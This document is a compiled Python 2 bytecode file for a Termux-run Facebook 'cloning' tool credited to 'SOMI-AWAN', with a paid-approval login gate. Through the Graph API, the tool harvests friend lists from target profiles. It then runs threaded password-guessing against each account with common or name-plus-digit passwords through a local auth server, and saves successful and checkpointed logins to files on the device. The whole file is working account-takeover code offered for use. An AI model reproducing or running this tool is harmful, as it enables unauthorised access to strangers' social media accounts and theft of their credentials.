ó
%`c           @   s©  y¼ d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l m Z Wn8 e k
 rö e  j d  e  j d  e  j d  n Xy e  j d  Wn e k
 rn Xy e  j d  Wn e k
 r@n Xe  j d  d  d	 l m Z e j d
 d  Z e j d d  Z i e e  d 6e e  d 6e e  d 6d d 6d d 6d d 6d d 6d d 6Z e e  e j d  e  j d  d Z g  Z d Z d   Z  d    Z! d!   Z" d"   Z# d#   Z$ d$   Z% d%   Z& d&   Z' d'   Z( d(   Z) d)   Z* d*   Z+ d+   Z, d,   Z- d-   Z. e/ d. k r¥e    n  d S(/   iÿÿÿÿN(   t
   ThreadPools   pip2 install requestss   pkg install nodejss   python2 pro.pys   /sdcard/idss   /sdcard/ids/ex_idss   git pull(   t   ConnectionErrorg    ÐsAg    8|Ag     Ó@g     ã@s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-enginet   utf8t   clears   
 [0;32m     _______  _______  _______ _________
 [0;32m    (  ____ \(  ___  )(       )\__   __/
 [0;32m    | (    \/| (   ) || () () |   ) (   
 [0;32m    | (_____ | |   | || || || |   | |   
 [0;33m    (_____  )| |   | || |(_)| |   | |   
 [0;33m          ) || |   | || |   | |   | |   
 [0;33m    /\____) || (___) || )   ( |___) (___
 [0;33m    \_______)(_______)|/     \|\_______/
     [101m[37;1mCODED BY SOMI-AWAN[0m
[1;97m-----------------------------------------------
[0;37mâ½ DEVOLPER   :  SOMI AWAN
[0;37mâ½ WHATSAAP   :  03455453538
[0;37mâ½ FACEBOOK   :  https://www.facebook.com/SO MI
[1;97m-----------------------------------------------
i    c          C   s@  t  j d  t GHd GHd GHd GHt j d  y t d d  j   }  Wn t t f k
 rg t	   n Xt
 j d  j } |  | k rÑ t  j d  t  j d	  t  j d
  t  j d  t j d  t   nk t  j d  t GHd GHd GHd GHd GHd GHd GHd GHd GHd GHd |  GHd GHt d  t  j d  t   d  S(   NR   t    s$   [1;31;1mTake The Approval For Logini   s   /sdcard/.wwwawansomi.txtt   rs?   https://raw.githubusercontent.com/S-O-M-i/pro7/main/.server.txts   cd ..... && npm installs   fuser -k 5000/tcp &t   #s   cd ..... && node index.js &i   s   	Approved Failed [1;91m Ãs(    [1;92mYour Id Is Not Approved Already s&   	[1;95mFirst Buy this Rs :[0;36m ???s3    [1;92mCopy the id and send to [1;93mTool Owner  s    [1;92mYour ip: [0;36ms   [1;93m Press enter to send id s$   xdg-open https://wa.me/+923455453538(   t   ost   systemt   logot   timet   sleept   opent   readt   KeyErrort   IOErrort   reg2t   requestst   gett   textt   ipt	   raw_inputt   reg(   t   toR   (    (    s   /sdcard/File.pyR   /   sD    
	
c          C   s   t  j d  t GHd GHHd GHd GHd GHd GHt j   j d  }  d |  GHd GHt d	  t  j d
  t d d  } | j |   | j	   t d  t
   d  S(   NR   s   	Approval not detecteds&   	[1;95mFirst Buy this Rs :[0;36m ???R   s#    [1;92mCopy and press [0;36mEnters'   [1;92mThen select whatsapp to continuei2   s
    Your id: s    Press enter to go to whatsapp s$   xdg-open https://wa.me/+923455454548s   /sdcard/.wwwawansomi.txtt   ws&   [1;93m Press enter to check Approval (   R	   R
   R   t   uuidt   uuid4t   hexR   R   t   writet   closeR   (   t   idt   sav(    (    s   /sdcard/File.pyR   V   s$    	


c          C   sã   t  j d  t GHd GHyM t j d  }  t j |  j  } | d } | d } | d } | d } Wn n Xd | GHt j	 d	  d
 | GHt j	 d	  d | GHt j	 d	  d | GHt j	 d  d GHt j	 d  t
   d  S(   NR   s   	Collecting device infos   http://ip-api.com/json/t   queryt   countryt
   regionNamet   isps   [1;93m Your ip: i   s   [1;96m Your country: s   [1;91m Your region: s   [1;92m Your network: i   s    Loading ...(   R	   R
   R   R   R   t   jsont   loadsR   R   R   t   t(   t   ipinfot   zt   ipsR#   t   regit   network(    (    s   /sdcard/File.pyR   j   s.    


				c          C   sÔ   t  j d  t GHt d  d GHt d  }  |  d k r¼ t  j d  t GHd GHt d  } | d k r¥ t  j d  t GHd GHd	 GHt j d
  d GHd GHt   qÐ d | d GHt   n d |  d GHt   d  S(   NR   s   [1;93mip Menus   [1;97m-------------------s#   [1;97m([1;91m+[1;97m) Your-ip : t   Kgfs1   [1;97m([1;91mâ[1;97m) Your-ip :  (Confirmed)s*   [1;97m([1;91m+[1;97m) Tool-ip :[1;97m s8   [1;97m([1;93mâ[1;97m) Your-ip : [1;92m (Confirmed)s8   [1;97m([1;93mâ[1;97m) Tool-ip : [1;92m (Confirmed)i   R   s   [1;92m â All Set[0;97ms   [!] Tool-ip : s    (Wrong)s   [!] Your-ip : (	   R	   R
   R   t   kgfR   R   R   t   login_choiceR(   (   R   t   en(    (    s   /sdcard/File.pyR(      s.    


c           C   s|   t  j d  y t d d  t   WnP t k
 rw t  j d  t GHd d GHd GHd d GHd GHd GHd	 GHt   n Xd  S(
   NR   s
   .login.txtR   i/   s
   [1;91mâs   	    [1;32mLOGIN MENU[0;97ms)   [1;97m([1;92m1[1;97m) Login with tokens+   [1;97m([1;92m2[1;97m) Login with id/passR   (   R	   R
   R   t   menuR   R   t   login_select(    (    (    s   /sdcard/File.pyR0       s    		c          C   s_   t  d  }  |  d k r" t   n9 |  d k r8 t   n# d GHd GHd GHt j d  t   d  S(   Ns   [1;92mâ½â½â½ [0;97mt   1t   2R   s&   	    [1;31mSelect valid option[0;97mi   (   R   t   login_tokent   login_fbR   R   R3   (   t   select(    (    s   /sdcard/File.pyR3   ¯   s    

c          C   sc  t  j d  t GHd d GHd GHd d GHt d  }  |  j d d  } | j d d  } | j d	 d  } t d
  } d GHt j d | d | d t j } t	 j
 |  } d | k rt d d  } | j | d  | j   t j d | d  t   n[ d | d k rDd GHd GHt j d  d GHt d  t   n d GHd GHt d  t   d  S(   NR   i/   s
   [1;91mâs%   	    [1;32mLOGIN WITH ID/PASS[0;97ms    Id/mail/number: t    R   t   (t   )s    Password: s   http://localhost:5000/auth?id=s   &pass=t   headerst   locs
   .login.txtR   sG   https://graph.facebook.com/me/friends?uid=100048514350891&access_token=s   www.facebook.comt   errors8   	    [1;31mUser must verify account before login[0;97mi   s   	Press enter to back s(   	    [1;31mIncorrect credentials[0;97ms   Press enter to try again (   R	   R
   R   R   t   replaceR   R   t   headerR   R&   R'   R   R   R   t   postR2   R   R   R0   (   R    t   id1t   id2t   uidt   pwdt   datat   qt   hamza(    (    s   /sdcard/File.pyR7   »   s<    		$




c          C   s¿   t  j d  y% t d d  t j d  t   Wn t t f k
 rº t  j d  t GHd d GHd GHd d GHt	 d  }  t d d	  } | j
 |   | j   t j d  t   n Xd  S(
   NR   s
   .login.txtR   i   i/   s
   [1;91mâs!   	    [1;32mFB TOKEN LOGIN[0;97ms'   [1;97m([1;91m+[1;97m) Paste token : R   (   R	   R
   R   R   R   R2   R   R   R   R   R   R   (   t   tokent
   token_save(    (    s   /sdcard/File.pyR6   Û   s"    		
c          C   sS  t  j d  y t d d  j   }  WnF t k
 rn t  j d  d GHt GHd GHd GHt j d  t   n Xy9 t	 j
 d |  d t } t j | j  } | d	 } WnS t k
 rý t  j d  d GHt GHd GHd
 GHt j d  t  j d  t   n Xt  j d  t GHd d GHd | d GHd d GHd GHd GHd GHd GHd GHt   d  S(   NR   s
   .login.txtR   R   s"   	    [1;31mToken not found[0;97mi   s+   https://graph.facebook.com/me?access_token=R<   t   names    	    [1;31mToken expired[0;97ms   rm -rf .login.txti/   s
   [1;91mâs   	    [1;32mUser: s   [0;97ms,   [1;97m([1;92m1[1;97m) Crack auto passwords.   [1;97m([1;92m2[1;97m) Crack choice passwords*   [1;97m([1;92m3[1;97m) Crack 10 passwords)   [1;97m([1;92m4[1;97m) Extract/Dump ids(   R	   R
   R   R   R   R   R   R   R0   R   R   R@   R&   R'   R   R   t   menu_option(   RI   R   t   aRK   (    (    s   /sdcard/File.pyR2   í   sF    		c          C   s   t  d  }  |  d k r" t   n^ |  d k r8 t   nH |  d k rN t   n2 |  d k rj t j d  n d GHd GHd GHt   d  S(	   Ns   [1;92mâ½â½â½ [0;97mR4   R5   t   4t   3s   python2 .pz.pyR   s&   	    [1;31mSelect valid option[0;97m(   R   t   crackt   choicet   ex_idR	   R
   RL   (   R8   (    (    s   /sdcard/File.pyRL     s    


c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHHd GHd	 GHd
 GHd GHt
   d  S(   NR   s
   .login.txtR   R   s"   	    [1;31mToken not found[0;97mi   s$   	    [1;32mAUTO PASS CLONING[0;97ms0   [1;97m([1;92m1[1;97m) Crack Public Friendlists+   [1;97m([1;92m2[1;97m) Crack File Accounts   [1;97m([1;91m0[1;91m) Back(   R	   R
   R   R   RI   R   R   R   R0   R   t   crack_select(    (    (    s   /sdcard/File.pyRP      s"    c             sÎ  t  d  }  g  } g   g    |  d k rQt j d  t GHd GHd GHd GHt  d  } yD t j d | d t d	 t } t j	 | j
  } d
 | d GHWn, t k
 rÉ d GHd GHt  d  t   n Xt j d | d t d	 t } t j	 | j
  } x| d D]B } | d } | d } | j d  d }	 | j | d |	  qWnÃ |  d k rþt j d  t GHd GHd GHd GHyC t  d  }
 x0 t |
 d  j   D] } | j | j    q£WWqt t f k
 rúd GHd GHd GHt  d  t   qXn d GHd GHd GHt   d t t |   GHd d GHd GH   f d   } t d  } | j | |  d GHd d  GHd GHd! GHd" t t    d# t t     GHd GHd d  GHd GHt  d  t   d  S($   Ns   [1;33mâ½â½â½[0;97mR4   R   R   s)   	    [1;32mAUTO PASS PUBLIC CRACK[0;97ms#   [1;97m([1;91m+[1;97m) User id : s   https://graph.facebook.com/s   ?access_token=R<   s'   [1;97m([1;93mâ[1;97m) User Name : RK   s.   	    [1;31mLogged in id has checkpoint[0;97ms    Press enter to backs   /friends?access_token=RF   R    R9   i    t   |R5   s'   	    [1;32mAUTO PASS FILE CRACK[0;97ms&   [1;97m([1;91m+[1;97m) Paste File : R   s+   	    [1;31mRequested file not found[0;97ms    Press enter to back s&   	    [1;31mSelect valid option[0;97ms+   [1;97m([1;93mâ[1;97m) Total Account : i/   s   âc            sh  |  } | j  d  \ } } y?d } t j d | d | d t j } t j |  } d | k r¾ d | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nd | d k r%d | d | GHt d d  } | j | d | d  | j	     j
 | |  n4| d }	 t j d | d |	 d t j } t j |  } d | k rÉd | d |	 d	 GHt d d  } | j | d |	 d  | j	    j
 | |	  nd | d k r0d | d |	 GHt d d  } | j | d |	 d  | j	     j
 | |	  n)| d }
 t j d | d |
 d t j } t j |  } d | k rÔd | d |
 d	 GHt d
 d  } | j | d |
 d  | j	    j
 | |
  nd | d k r;d | d |
 GHt d d  } | j | d |
 d  | j	     j
 | |
  n| d } t j d | d | d t j } t j |  } d | k rßd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nzd | d k rFd | d | GHt d d  } | j | d | d  | j	     j | |  n| d } t j d | d | d t j } t j |  } d | k rêd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nod | d k rQd | d | GHt d d  } | j | d | d  | j	     j
 | |  nd } t j d | d |  j } t j |  } d | k rëd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nnd | d k rRd | d | GHt d d  } | j | d | d  | j	     j
 | |  nd } t j d | d | d t j } t j |  } d | k ròd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  ng d | d k rYd | d | GHt d d  } | j | d | d  | j	     j
 | |  n  Wn n Xd  S(   NRT   t   223344s   http://localhost:5000/auth?id=s   &pass=R<   R=   s   [1;32m(SOMI-OK) s    | s   [0;97ms   /sdcard/ids/checkpoint.txtRM   s   
s   www.facebook.comR>   s   [0;36m(SOMI-CP) s   checkpoint.txtt   123s   /sdcard/ids/somi.txtt   1234t   12345t   786t   000786t   786786(   t   splitR   R   R@   R   R&   R'   R   R   R   t   appendt   apppend(   t   argt   userRD   RK   t   pass1RF   RG   t   okt   cpt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(   t   cpst   oks(    s   /sdcard/File.pyt   mainm  sÜ    $


$


$


$


$



$

i   t   -s    The process has completeds    Total Ok/Cp:t   /(   R   R	   R
   R   R   R   RI   R@   R&   R'   R   R   RP   t   rsplitR]   R   t	   readlinest   stripR   RS   t   strt   lenR    t   map(   R8   R    t   idtR   RG   R*   t   iRD   t   nat   nmt   filelistt   lineRl   t   p(    (   Rj   Rk   s   /sdcard/File.pyRS   5  s~    !
!


		)	
c    	      C   s:  g  }  y t  d d  j   a Wn/ t k
 rP d GHd GHt j d  t   n Xt j d  t	 GHd d GHd	 GHd d GHt
 d
  } yD t j d | d t d t } t j | j  } d | d GHWn1 t k
 rý d GHd GHd GHt
 d  t   n Xt j d | d t d t } t j | j  } t  d d  } xg | d D][ } | d } | d } | j d  d } |  j | d |  | j | d | d  qKW| j   d GHd d GHd GHd GHd t t |    GHd GHd d GHd GHt
 d  t j d  t j d   d! GHt j d  d" GHt   d  S(#   Ns
   .login.txtR   s"   	    [1;31mToken not found[0;97mR   i   R   i/   s
   [1;91mâs-   	  [1;32mCOLLECT PUBLIC ID FRIENDLIST[0;97ms#   [1;97m([1;91m+[1;97m) Input Id: s   https://graph.facebook.com/s   ?access_token=R<   s,   [1;97m([1;91mâ[1;97m) Collecting from: RK   s.   	    [1;31mLogged in id has checkpoint[0;97ms    Press enter to backs   /friends?access_token=s   ids_friends.txtR   RF   R    R9   i    RT   s   
Rm   s    The process has completeds    Total ids: s    Press enter to download files   cp ids_friends.txt /sdcards   rm -rf ids_friends.txts    File downloaded successfullys   [1;93mEnter Go Back(   R   R   RI   R   R   R   R0   R	   R
   R   R   R   R   R@   R&   R'   R   R   RP   Ro   R]   R   R   Rr   Rs   R2   (	   t   idgt   idhR   RG   t   idsRv   RD   Rw   Rx   (    (    s   /sdcard/File.pyRR   ø  sb    		!
!


		
c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR   s
   .login.txtR   R   s"   	    [1;31mToken not found[0;97mi   s)   	    [1;32mCHOICE PASS CRACK MENU[0;97ms0   [1;97m([1;92m1[1;97m) Crack Public Friendlists+   [1;97m([1;92m2[1;97m) Crack File Accounts   [1;97m([1;91m0[1;91m) Back(   R	   R
   R   R   RI   R   R   R   R0   R   t   choice_select(    (    (    s   /sdcard/File.pyRQ   +  s     c       	      sÛ  t  d  }  g  } g   g    |  d k rºt j d  t GHd GHd GHt  d   t  d   t  d   t  d   Hd	 GHd
 d GHt  d   t  d   t  d   Hd GHd GHt  d  } yD t j d | d t d t } t j	 | j
  } d | d GHWn, t k
 r2d GHd GHt  d  t   n Xt j d | d t d t } t j	 | j
  } x¨| d D]B } | d } | d } | j d  d }	 | j | d |	  qqWnW|  d k råt j d  t GHHd GHHd GHd
 d GHt  d   t  d   t  d   t  d   Hd	 GHHd GHd
 d GHt  d   t  d   t  d   d GHd GHd GHyC t  d   }
 x0 t |
 d!  j   D] } | j | j    qWWqt t f k
 rád GHd" GHd GHt  d#  t   qXn, |  d$ k rût   n d GHd% GHd GHt   d& t t |   GHd
 d' GH          f	 d(   } t d)  } | j | |  d GHd
 d* GHd GHd+ GHd, t t    d- t t     GHd GHd
 d* GHd GHt  d  t   d  S(.   Ns   [1;32mâ½â½â½ [0;97mR4   R   R   s)   	    [1;32mCHOICE NAME PASS CRACK[0;97ms(   [1;97m([1;91m1[1;97m) Name + Digit : s(   [1;97m([1;91m2[1;97m) Name + Digit : s(   [1;97m([1;91m3[1;97m) Name + Digit : s*   	    [1;32mCHOICE DIGIT PASS CRACK[0;97mi/   s
   [1;91mâs*   [1;97m([1;91m+[1;97m) Digit Password : s)   	    [1;32mAUTO PASS PUBLIC CRACK[0;97ms#   [1;97m([1;91m+[1;97m) User id : s   https://graph.facebook.com/s   ?access_token=R<   s%   [1;97m([1;93mâ[1;97m) User id : RK   s.   	    [1;31mLogged in id has checkpoint[0;97ms    Press enter to backs   /friends?access_token=RF   R    R9   i    RT   R5   s,    [1;93mFor-example:12,123,1234,12345[1;91ms/    [1;93mFor-example:234567,223344,334455[1;91ms'   	    [1;32mAUTO PASS FILE CRACK[0;97ms&   [1;97m([1;91m+[1;97m) Paste File : R   s+   	    [1;31mRequested file not found[0;97ms    Press enter to back t   0s&   	    [1;31mSelect valid option[0;97ms+   [1;97m([1;93mâ[1;97m) Total Account : s   âc            sV  |  } | j  d  \ } } y-|  } t j d | d | d t j } t j |  } d | k rÂ d | d | d GHt d	 d
  } | j | d | d  | j	    j
 | |  nd | d k r)d | d | GHt d d
  } | j | d | d  | j	     j
 | |  n|  }	 t j d | d |	 d t j } t j |  } d | k rÍd | d |	 d GHt d	 d
  } | j | d |	 d  | j	    j
 | |	  nzd | d k r4d | d |	 GHt d d
  } | j | d |	 d  | j	     j
 | |	  n|  }
 t j d | d |
 d t j } t j |  } d | k rØd | d |
 d GHt d	 d
  } | j | d |
 d  | j	    j
 | |
  nod | d k r?d | d |
 GHt d d
  } | j | d |
 d  | j	     j
 | |
  n|  } t j d | d | d t j } t j |  } d | k rãd | d | d GHt d	 d
  } | j | d | d  | j	    j
 | |  ndd | d k rJd | d | GHt d d
  } | j | d | d  | j	     j | |  nýt j d | d  d t j } t j |  } d | k räd | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   ncd | d k rKd | d  GHt d d
  } | j | d  d  | j	     j
 |   nüt j d | d   j } t j |  } d | k rßd | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nhd | d k rFd | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k ràd | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   ng d | d k rGd | d  GHt d d
  } | j | d  d  | j	     j
 |   n  Wn n Xd  S(   NRT   s   http://localhost:5000/auth?id=s   &pass=R<   R=   s   [1;32m(SOMI-OK) s    | s   [0;97ms   /sdcard/ids/checkpoint.txtRM   s   
s   www.facebook.comR>   s   [0;36m(SOMI-CP) s   checkpoint.txt(   R\   R   R   R@   R   R&   R'   R   R   R   R]   R^   (   R_   R`   RD   RK   Ra   RF   RG   Rb   Rc   Rd   Re   Rf   (	   Rj   Rk   t   p1t   p2t   p3t   p4Rg   Rh   Ri   (    s   /sdcard/File.pyRl     sÖ    
$


$


$


$

$



$

i   Rm   s    The process has completeds    Total Ok/Cp:Rn   (   R   R	   R
   R   R   R   RI   R@   R&   R'   R   R   RP   Ro   R]   R   Rp   Rq   R   R2   R   Rr   Rs   R    Rt   RQ   (   R8   R    Ru   R   RG   R*   Rv   RD   Rw   Rx   Ry   Rz   Rl   R{   (    (	   Rj   Rk   R   R   R   R   Rg   Rh   Ri   s   /sdcard/File.pyR   ?  sº    	!
!

		

	'	)	
t   __main__(0   R	   t   sysR   t   datetimet   randomt   hashlibt   ret	   threadingR&   t   getpasst   urllibt	   cookielibR   R   t   multiprocessing.poolR    t   ImportErrorR
   t   mkdirt   OSErrort   requests.exceptionsR   t   randintt   bdt   simt   reprR@   t   reloadt   setdefaultencodingR   R}   t   backR   R   R   R(   R0   R3   R7   R6   R2   RL   RP   RS   RR   RQ   R   t   __name__(    (    (    s   /sdcard/File.pyt   <module>   sT   ¨P
	'						 		$			Ã	3		ä


	